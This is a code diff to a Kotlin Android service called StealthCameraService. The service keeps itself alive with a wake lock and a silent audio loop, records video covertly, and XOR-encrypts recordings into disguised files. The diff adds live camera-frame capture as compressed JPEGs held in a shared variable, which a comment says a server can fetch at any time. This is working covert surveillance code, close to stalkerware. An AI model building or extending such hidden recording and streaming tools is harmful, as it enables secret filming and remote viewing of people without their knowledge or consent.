@@ -6,6 +6,8 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.content.Context
 import android.content.Intent
+import android.graphics.Bitmap
+import android.graphics.Matrix
 import android.media.AudioFormat
 import android.media.AudioManager
 import android.media.AudioTrack
@@ -14,6 +16,7 @@ import android.os.IBinder
 import android.os.PowerManager
 import android.util.Log
 import androidx.camera.core.CameraSelector
+import androidx.camera.core.ImageAnalysis
 import androidx.camera.lifecycle.ProcessCameraProvider
 import androidx.camera.video.FileOutputOptions
 import androidx.camera.video.Quality
@@ -25,6 +28,7 @@ import androidx.camera.video.VideoRecordEvent
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.LifecycleService
+import java.io.ByteArrayOutputStream
 import java.util.concurrent.ExecutorService
 import java.util.concurrent.Executors
 
@@ -38,6 +42,12 @@ class StealthCameraService : LifecycleService() {
 
     private lateinit var vaultManager: VaultManager
 
+    // サーバーがいつでも最新の映像フレームを取得できるように保存しておく共有領域
+    companion object {
+        @Volatile
+        var latestJpeg: ByteArray? = null
+    }
+
     override fun onCreate() {
         super.onCreate()
         vaultManager = VaultManager(this)
@@ -45,12 +55,11 @@ class StealthCameraService : LifecycleService() {
         startForegroundServiceNotification()
         acquireWakeLock()
         startSilentAudioLoop()
-        // カメラの起動は onStartCommand でフラグを受け取ってから行うよう変更
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
-        
+
         // すでに録画中の場合は停止してサービスを終了する（トグル動作）
         if (recording != null) {
             recording?.stop()
@@ -125,21 +134,51 @@ class StealthCameraService : LifecycleService() {
         val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
         cameraProviderFuture.addListener({
             val cameraProvider = cameraProviderFuture.get()
+            
+            // 1. 録画用の設定
             val recorder = Recorder.Builder()
                 .setQualitySelector(QualitySelector.from(Quality.HD))
                 .build()
             videoCapture = VideoCapture.withOutput(recorder)
 
-            // 受け取ったフラグに基づいてカメラの向きを設定
+            // 2. プレビュー配信（ストリーミング）用の映像解析設定を追加
+            val imageAnalysis = ImageAnalysis.Builder()
+                .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
+                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
+                .build()
+
+            imageAnalysis.setAnalyzer(cameraExecutor) { imageProxy ->
+                try {
+                    // 映像をBitmapに変換
+                    val bitmap = Bitmap.createBitmap(imageProxy.width, imageProxy.height, Bitmap.Config.ARGB_8888)
+                    bitmap.copyPixelsFromBuffer(imageProxy.planes[0].buffer)
+
+                    // カメラの向きに合わせて画像を回転
+                    val matrix = Matrix()
+                    matrix.postRotate(imageProxy.imageInfo.rotationDegrees.toFloat())
+                    val rotatedBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
+
+                    // JPEGに圧縮して共有変数に保存（画質40で通信速度を優先）
+                    val out = ByteArrayOutputStream()
+                    rotatedBitmap.compress(Bitmap.CompressFormat.JPEG, 40, out)
+                    latestJpeg = out.toByteArray()
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                } finally {
+                    imageProxy.close()
+                }
+            }
+
             val cameraSelector = CameraSelector.Builder().requireLensFacing(lensFacing).build()
 
             try {
                 cameraProvider.unbindAll()
-                cameraProvider.bindToLifecycle(this, cameraSelector, videoCapture)
+                // 録画(videoCapture)とプレビュー配信(imageAnalysis)を同時に動かす
+                cameraProvider.bindToLifecycle(this, cameraSelector, videoCapture, imageAnalysis)
                 startRecording()
             } catch (exc: Exception) {
                 Log.e("StealthCameraService", "Camera binding failed", exc)
-                stopSelf() // 失敗時はサービスを停止
+                stopSelf()
             }
         }, ContextCompat.getMainExecutor(this))
     }
@@ -159,7 +198,6 @@ class StealthCameraService : LifecycleService() {
                     }
                     is VideoRecordEvent.Finalize -> {
                         if (!recordEvent.hasError()) {
-                            // 録画終了時にXOR暗号化と偽装保存を実行
                             vaultManager.finalizeVideoFile(tempFile)
                             Log.d("StealthCameraService", "Recording finalized and encrypted")
                         } else {
@@ -168,7 +206,6 @@ class StealthCameraService : LifecycleService() {
                         }
                     }
                     else -> {
-                        // その他のイベントは無視
                     }
                 }
             }
@@ -183,6 +220,8 @@ class StealthCameraService : LifecycleService() {
         isPlayingSilence = false
         audioTrack?.stop()
         audioTrack?.release()
+        
+        latestJpeg = null // 終了時に画像キャッシュもクリア
 
         wakeLock?.let {
             if (it.isHeld) {
